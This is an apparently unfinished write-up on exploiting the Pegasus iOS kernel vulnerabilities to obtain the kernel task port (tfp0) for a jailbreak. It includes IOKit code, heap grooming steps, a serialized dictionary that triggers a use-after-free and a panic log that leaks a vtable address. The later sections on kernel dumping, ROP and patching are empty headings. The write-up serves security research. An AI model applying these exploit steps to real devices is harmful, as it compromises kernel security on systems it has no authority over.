# tfp0 powered by Pegasus

or "how to exploit the Pegasus vulnerabilities on iOS".

## Introduction

Two months ago [@jndok](https://twitter.com/jndok) did an amazing writeup on [how to exploit the Pegasus vulnerabilities on OS X](https://jndok.github.io/2016/10/04/pegasus-writeup/). Now, iOS is more locked down than OS X, so exploitation is more complicated, but if [the original Pegasus spyware](https://www.lookout.com/trident-pegasus-enterprise-discovery) could do it, then so can we! :P  
In this writeup I'm gonna line out how exactly we can do so, and I'm gonna use that to install a kernel patch that allows the retrieval of the mighty `kernel_task` from userland once again, which has been missing in Pangu's 9.0.x and 9.2-9.3.3 jailbreaks.

Turning this into a full jailbreak should then be as simple as installing more kernel patches using the kernel task port and the Mach APIs, wrapping the whole code in an App and signing it with one's free personal developer certificate, but in this writeup I'm gonna leave it at the installation of the tfp0 kernel patch.

If you haven't already, I heavily suggest reading [jndok's writeup](https://jndok.github.io/2016/10/04/pegasus-writeup/) before continuing here.  
The following things are assumed to be well known/understood, and are explained in detail in his writeup:

- the OSSerializeBinary data format
- how the kernel slide info leak works
- how the UaF can be used to gain PC control

Note: This project included a lot of "firsts" for me. I've never before done ROP, played with IOKit, MIG or the kernel heap, etc, etc. As such it might me that this writeup contains some misconceptions or stuff that could be done a lot easier, faster or safer.  
If you spot anything like that, **please let me know** (via [GitHub issues](TODO), [Twitter](https://twitter.com/s1guza), [Email](TODO), or whatever).  
Also please don't hesitate to contact me if there's something you don't understand, of if you'd like more details on something.

I'm writing this in a way that should allow you to hack up your own implementation along the way, if you're interested in getting a hands-on experience on how these things work.

## Exploitation overview

Let's first look at what jndok does on OS X:

- `mmap()` the kernel from `/System/Library/Kernels/kernel`
- Leak the kernel slide
- Use kernel + slide to build ROP chain
- Use UaF with fake vtable to execute ROP chain
- ROP chain escalates privileges to root

That first step is gonna be a problem because on iOS <10, kernels are encrypted. There's two ways around that:

- Get decrypted kernels and hardcode stuff
- Dump the kernel at runtime

Hardcoding stuff is ugly and there are hardly any decryption keys available for 64-bit devices (although nice work on that iPhone6,1, [@xerub](https://twitter.com/xerub)), therefore the former doesn't seem like a viable option. So, can we somehow turn our UaF into an arbitrary read primitive?  
Let's see, we can read back the raw bytes of any dictionary property with `IORegistryEntryGetProperty`, and there are some classes with pointer and length properties, notably `OSData`, `OSString` and `OSSymbol`. If we can construct an object of one of these types over our freed `OSString`, we're all set (details are explained below, but it turns out `OSString` is the class of choice).  
In order to do that, we need to know the object's vtable address though, so we still need some knowledge about the kernel. But we've just reduced the required knowledge from a full dump to a single pointer.

Now, how do we gain knowledge of that single pointer?  
Note that vtables are stored in the `__DATA.__const` section, so once we know our vtab's offset from the kernel base as well as the kernel slide, we're all set.  
Unfortunately, as far as I'm aware the vtable pointer *cannot* be obtained at runtime (through the Pegasus vulnerabilities and without prior knowledge, that is). Since this is only a single value though, hardcoding it is... still ugly, but way more reasonable than before. So obtaining it once would be enough.  
Let's see what we can come up with:

- For most (but not all) 32-bit devices (and specifically the 6,1 model of the iPhone 5s) there will likely be [decryption keys available](https://www.theiphonewiki.com/wiki/Firmware_Keys/9.x).
- For all 64-bit devices except the iPhone 5s, there are no keys publicly available whatsoever, so we need an actual leak. For values that fit into a single register (such as a vtable address), panic logs can sometimes be abused for that. And it turns out that, if played well, this is one of those cases (exclusive to 64-bit though).
- For the few remaining devices (iPad2,4, iPod5,1 and (for iOS >=9.3) iPad3,4-iPad3,6), neither of the above will work. But now that we've got the desired info from a lot of devices and iOS versions, it becomes possible to combine brute forcing and educated guessing, such that we need relatively few tried to correctly guess the address.

At this point we've conceptually taken care of the first point on jndok's list. So what else is there?

We want to install a kernel patch to allow for tfp0, so we obviously need to add that to the list. Installing a kernel patch through ROP sounds unnecessarily complicated to me though, so let's use ROP to merely *retrieve* the kernel task first without any patch, and then use the Mach APIs on the kernel to put the actual patch in place. And since we're only using methods accessible from within the sandbox, we can skip privilege escalation entirely.

Now, at last we have an idea what we want our process to look like:

- Obtain the `OSString` vtable pointer once somehow, then hardcode it
- Leak the kernel slide
- Use UaF with valid vtable to read arbitrary memory/dump the kernel
- Use kernel + slide to build ROP chain
- Use UaF with fake vtable to execute ROP chain
- ROP chain makes `kernel_task` available userland
- Use `kernel_task` to install kernel patches

With that laid out, let's look at the details.

## Preparations

Before we can actually get to pwning, we need to set up a few things.

#### Setting up the build environment

The Pegasus vulnerabilities are in IOKit, so we need to link against the IOKit framework. Apple's iOS SDK doesn't come with IOKit headers (anymore?), so we have use those of OS X.  
For that we create a local `./include` directory that we later pass to the compiler with `-I./include`, and to where we simply symlink the IOKit header directory:

    ln -s /System/Library/Frameworks/IOKit.framework/Headers ./include/IOKit

We also use some IOKit MIG functions, which are perfectly available on 32-bit (`iokitmig.h`) but private (non-exported) on 64-bit.  
We _could_ write a 32-bit binary able to exploit both a 32-bit and 64-bit kernel, but having the same data types and sizes as the kernel is just so much more convenient. And after all, generating the MIG routines yourself and statically linking against them turns out to be simple enough. I found very little info on this on the web though, so here's the process in detail:

There's a `mig` utility to create C source files from .defs, in the case of the IOKit MIG functions, `xnu-src/osfmk/device/device.defs`.  
We run it as `xcrun -sdk iphoneos mig` to get the iOS environment and add `-arch arm64` to set the correct target architecture (I'm not sure whether the generated C code differs at all between architectures, but at some point it *might*, so I'm trying to do this the correct way). Examining the file, we can also see that if the `IOKIT` macro is not defined, we get hardly anything, so we're gonna add a `-DIOKIT` to our flags. Lastly, we need some other .defs files to be included but we can't specify `xnu-src/osfmk` as an include directory because it contains some files that will `#error` when the architecture is neither i386 nor x86_64, so we symlink the following files (from `xnu-src/osfmk`) to our local `./include` directory:

    mach/clock_types.defs
    mach/mach_types.defs
    mach/std_types.defs
    mach/machine/machine_types.defs

Finally we can run:

    xcrun -sdk iphoneos mig \
    -arch arm64 \
    -DIOKIT \
    -I./include \
    xnu-src/osfmk/device/device.defs

This will generate three files:

    iokit.h
    iokitServer.c
    iokitUser.c

Including `iokit.h` and `iokitUser.c` in our program will provide us with the full set of IOKit MIG functions. `iokitServer.c` isn't needed as such, but it can still serve as a good reference to understand how exactly the kernel passes our MIG calls to its `is_io_*` functions.

Now we're fully equipped to play with IOKit on both armv7 and arm64! :D

#### Recap: IOKit, data structures and the info leak

Without much comment, a quick recap/reference on some key points:

-   Feeding XML/binary to IOKit & retrieving property bytes (omitted error handling):

        // The choice of `serviceName` determines availability & permissions from within the sandbox.
        void io_derp(char *serviceName, void *dict, size_t dictlen, char *key, void *buf, uint32_t *buflen)
        {
            mach_port_t master;
            io_service_t service;
            io_connect_t client;
            kern_return_t err;
            io_iterator_t it;

            host_get_io_master(mach_host_self(), &master);
            service = IOServiceGetMatchingService(master, IOServiceMatching(serviceName));
            io_service_open_extended(service, mach_task_self(), 0, NDR_record, dict, dictlen, &err, &client);
            IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &it);
            IORegistryEntryGetProperty(IOIteratorNext(it), key, buf, buflen);
            IOServiceClose(client);
        }

    *The full implementation for this can be found in `io.c`.*

-   Constants:

        enum
        {
            kOSSerializeDictionary      = 0x01000000U,
            kOSSerializeArray           = 0x02000000U,
            kOSSerializeSet             = 0x03000000U,
            kOSSerializeNumber          = 0x04000000U,
            kOSSerializeSymbol          = 0x08000000U,
            kOSSerializeString          = 0x09000000U,
            kOSSerializeData            = 0x0a000000U,
            kOSSerializeBoolean         = 0x0b000000U,
            kOSSerializeObject          = 0x0c000000U,

            kOSSerializeTypeMask        = 0x7F000000U,
            kOSSerializeDataMask        = 0x00FFFFFFU,

            kOSSerializeEndCollection   = 0x80000000U,

            kOSSerializeMagic           = 0x000000d3U,  // My creation, equivalent to "\323\0\0"
        };

        enum
        {
            kOSStringNoCopy = 0x00000001,               // For OSString.flags
        };

-   `OSString` in C terms:

        typedef struct
        {
            void      ** vtab;          // C++,      for virtual function calls
            int          retainCount;   // OSObject, for reference counting
            unsigned int flags;         // OSString, for managed/unmanaged string buffer
            unsigned int length;        // OSString, string buffer length
            const char * string;        // OSString, string buffer address
        } OSString;

    Concrete memory layout:

        typedef struct
        {
            uint32_t vtab;
            uint32_t retainCount;
            uint32_t flags;
            uint32_t length;
            uint32_t string;
        } OSString32;
        // sizeof(OSString32) == 20

        typedef struct
        {
            uint32_t vtab_lo;
            uint32_t vtab_hi;
            uint32_t retainCount;
            uint32_t flags;
            uint32_t length;
            uint32_t padding;   // <-- note
            uint32_t string_lo;
            uint32_t string_hi;
        } OSString64;
        // sizeof(OSString64) == 32

-   The first method called on any `kOSSerializeObject` is `retain()`, which is the 5th entry in the vtable (i.e. `vtab[4]`).

-   The kernel slide info leak can be copied from jndok's code with only minor changes. On x86_64 it was `buf[7]` that held a useful address, on arm64 it's `buf[1]` (TODO: armv7).  
    One can figure out which values are gonna be of use, and what their unslid equivalents are like this:
    - Read some 200 bytes off the kernel stack repeatedly, and check for values that start with `ffffff80` and don't change (unless you reboot).
    - Write that value down somewhere, then cause a kernel panic (e.g. by trying to read 4096 bytes off the stack). Obtain the kernel slide from the panic log and subtract it from the value you wrote down. Done.

## Part One: Obtaining the OSString vtable address

As stated in the overview, all of `OSData`, `OSString` and `OSSymbol` contain both a buffer pointer and length field, which we could abuse together with `IORegistryEntryGetProperty` to retrieve arbitrary kernel memory. However:

- The 64-bit panic leak works by far best with the `OSString` class.
- An `OSString` is the best fit for reallocation over another freed `OSString`, the other two are larger.
- `OSString`

So the `OSString` vtable it is. Now let's look at how to get it.

#### The good: decrypted kernels

If [keys are available](https://www.theiphonewiki.com/wiki/Firmware_Keys/9.x), we can just grab the kernelcache from our IPSW, run it through [`xpwntool(-lite)`](https://github.com/sektioneins/xpwntool-lite) and [`lzssdec`](http://nah6.com/~itsme/cvs-xdadevtools/iphone/tools/lzssdec.cpp), and we've got the raw kernel binary.  
Since decrypted kernels are symbolicated, we merely have to search its symbol table for `__ZTV8OSString` (symbols starting with `__ZTV` are vtables (TODO: reference)):

    $ nm kernel | grep __ZTV8OSString
    803ece8c S __ZTV8OSString           # iPhone4,1 9.3.3
    803f4e8c S __ZTV8OSString           # iPhone5,4 9.3.3
    ffffff80044ef1e0 S __ZTV8OSString   # iPhone6,1 9.3.3

As one can see with a hex utility (like `hexdump` or [`radare2`](https://github.com/radare/radare2)) however (first column is offsets, rest is data):

    $ r2 -c '0x803f4e8c; xw 32' -q iPhone5,4/kernel 2>/dev/null
    0x803f4e8c  0x00000000 0x00000000 0x80321591 0x80321599  ..........2...2.
    0x803f4e9c  0x8030d605 0x8030d4a5 0x8030d5fd 0x8030d5f5  ..0...0...0...0.

<!-- -->

    $ r2 -c '0xffffff80044ef1e0; xq 64' -q iPhone6,1/kernel 2>/dev/null
    0xffffff80044ef1e0  0x0000000000000000  0x0000000000000000   ................
    0xffffff80044ef1f0  0xffffff80043ea7c4  0xffffff80043ea7d0   ..>.......>.....
    0xffffff80044ef200  0xffffff80043cea00  0xffffff80043ce864   ..<.....d.<.....
    0xffffff80044ef210  0xffffff80043ce9f0  0xffffff80043ce9e0   ..<.......<.....

There are two machine words before the actual vtable starts, so the actual address we're looking for is at offset `2 * sizeof(void*)` from the `__ZTV...` address.

#### The bad: panic logs

I stumbled across this method by accident while trying to play with `OSString`s while they were freed (which won't work due to heap poisoning - if you've never heard of that, I suggest reading Stefan Esser's [iOS 10 kernel heap revisited](http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf) slides).  
Anyway, here are a few raw facts:

- The first machine word of a C++ object is (interpreted as) a pointer to its vtable.
- The first machine word of a node in the freelist is a pointer to the next node in the freelist.
- Pages (i.e. chunks of *contiguous memory*) are allocated as a whole into a kalloc zone.
- `retain()` is the 5th element in the vtable.
- (arm64) The 5th element in an array of pointers is at an offset of 32 bytes.
- (arm64) `OSString`s are 32 bytes wide.

See what I'm getting at? :P  
Here's a visualization:

![Normal heap layout](heap1.svg)

Now what happens when `retain()` is called on an OSString that was freed, but not yet reallocated?  
In other words, what happens when we *combine* the above?

![Reference to node in freelist](heap2.svg)

So what used to be our object's vtable pointer is now a pointer to the next node in the freelist. And what is treated as a pointer to `retain()` is the value just out of bounds of that next node.  
Now, is there any way of predicting what value that area of memory is gonna hold?

- If our (freed) object occupies the last 32 bytes on a memory page, the adjacent memory could hold anything or be unmapped. We have no way of telling, which makes this case pretty useless to us. But since, on arm64, memory pages are 16 kB, the chance of that happening in the kalloc.32 zone are 1 in 512. In the other 511 cases we're still within the same memory page, which means still in kalloc.32-managed memory, so the adjacent memory can only be a 32-byte chunk that is either allocated or free.
- If it is free, then it's only gonna hold a pointer to the next node in the freelist and some `0xdeadbeef`. Again useless to us.
- If it is allocated, it could hold anything... but if it's another `OSString` for example, then a call to `retain()` on our original freed object is going to load the first 8 bytes of this object, which happen to be the address of the `OSString` vtable, and it will try to branch to that address. And since that address lies within a non-executable segment, this is gonna lead to a "Kernel instruction fetch abort" panic, creating a panic log with the `OSString` vtable address in `pc`. At last, something that sounds useful.

Now that we know what *could* be there, how can we *make that happen*? How can we arrange for our freed `OSString` to lie next to another `OSString`?  
By making allocations and deallocations of course (hooray for [Heap Feng Shui](https://en.wikipedia.org/wiki/Heap_feng_shui)). And we can do that by passing dictionary with `kOSSerializeString`s to `io_service_open_extended` for allocation, and the returned client handle to `IOServiceClose` for deallocation. So:

- When our program starts, there could be any number of nodes from any memory page in the kalloc.32 freelist. But once all nodes in the freelist are used up and a new page is mapped, all nodes in the freelist will be from that page. So the first thing we do is allocate a lot of strings. (I used 255 strings here.)
- Next we're gonna allocate some more strings, always alternating between a bunch (I chose 64) and only one in the dictionary. And we're gonna do that a couple of times too (I did 16 each).
- Then we're gonna release all clients with a single string in their dictionary, thus "poking holes" into the heap, in a way that each hole is pretty likely to be surrounded by `OSString` objects.

Visualized again:

![Heap Feng Shui](heap3.svg)

(The dictionaries to achieve this are straightforward and make no use of any bugs so far.)

Now we're gonna parse a rather simple dictionary:

    uint32_t dict[5] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries

        kOSSerializeString | 4,                                         // String that'll get freed
        *((uint32_t*)"str"),
        kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
    };

`kOSSerializeString` will cause an `OSString` to get allocated, hopefully in one of those lonely holes we've punched into the heap, and when it is freed again shortly after, we're left with `objsArray[1]` holding a pointer to that chunk of memory that is surrounded by allocated `OSString`s.  
`kOSSerializeObject` will then attempt to call `retain()` on that chunk of freed memory, thus unfolding the process explained above, ultimately causing a kernel panic and logging the vtable address in the panic log:

    panic(cpu 0 caller 0xffffff801befcc1c): "Kernel instruction fetch abort: pc=0xffffff801c2ef1f0 iss=0xf far=0xffffff801c2ef1f0. Note: the faulting frame may be missing in the backtrace."
    Debugger message: panic
    OS version: 13G34
    Kernel version: Darwin Kernel Version 15.6.0: Mon Jun 20 20:10:22 PDT 2016; root:xnu-3248.60.9~1/RELEASE_ARM64_S8000
    iBoot version: iBoot-2817.60.2
    secure boot?: YES
    Paniclog version: 5
    Kernel slide:     0x0000000017e00000
    Kernel text base: 0xffffff801be04000
    Epoch Time:        sec       usec
      Boot    : 0x58225b8c 0x00000000
      Sleep   : 0x00000000 0x00000000
      Wake    : 0x00000000 0x00000000
      Calendar: 0x58225bec 0x00028e96

    Panicked task 0xffffff811d67bdc0: 78 pages, 1 threads: pid 748: cl0ver
    panicked thread: 0xffffff811f2f9000, backtrace: 0xffffff8012f03120
              lr: 0xffffff801bf043c4  fp: 0xffffff8012f03170
              lr: 0xffffff801be2e11c  fp: 0xffffff8012f031d0
              lr: 0xffffff801befcc1c  fp: 0xffffff8012f032c0
              lr: 0xffffff801befb1f0  fp: 0xffffff8012f032d0
              lr: 0xffffff801c1f0678  fp: 0xffffff8012f03720
              lr: 0xffffff801c25b4cc  fp: 0xffffff8012f03840
              lr: 0xffffff801bedaa00  fp: 0xffffff8012f038a0
              lr: 0xffffff801be194c8  fp: 0xffffff8012f03a30
              lr: 0xffffff801be27b78  fp: 0xffffff8012f03ad0
              lr: 0xffffff801befd6b0  fp: 0xffffff8012f03ba0
              lr: 0xffffff801befbd40  fp: 0xffffff8012f03c90
              lr: 0xffffff801befb1f0  fp: 0xffffff8012f03ca0
              lr: 0x00000001819b0fd8  fp: 0x0000000000000000

`0xffffff801c2ef1f0 - 0x0000000017e00000 = 0xffffff80044ef1f0`, there we go.

*The full implementation for this can be found in `uaf_panic.c`.*

#### The ugly: semi-blind guessing



## Part Two: Dumping the kernel



*The full implementation for this can be found in `uaf_read.c`.*

## Part Three: ROP

## Part Four: Patching the kernel

## Conclusion

## Credits & thanks

First and foremost I would like to thank [@jndok](https://twitter.com/jndok) (as well as all the people he credits and thanks) for [his amazing writeup](https://jndok.github.io/2016/10/04/pegasus-writeup/) and the accompanying PoC. My work here is entirely based on yours.

Also thanks to:

- The guys at [Citizenlab](https://citizenlab.org/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/) and [Lookout](https://www.lookout.com/trident-pegasus-enterprise-discovery) for the initial analysis of the Pegasus spyware.
- [Stefan Esser (@i0n1c)](https://twitter.com/i0n1c) for [his iOS 10 kernel heap presentation](http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf) - extremely useful when abusing stuff on the heap.
- [Jonathan Levin (@Morpheus______)](https://twitter.com/Morpheus______) for his awesome tools, especially [joker](http://www.newosxbook.com/tools/joker.html) - saved me weeks of work at the very least.
- Everyone at [radare2](https://github.com/radare/radare2) for the (in my humble opinion) most powerful and advanced reverse engineering toolkit out there.
- [Rohit Mothe (@rohitwas)](https://twitter.com/rohitwas) for so tirelessly discussing and rethinking this project over and over with me.
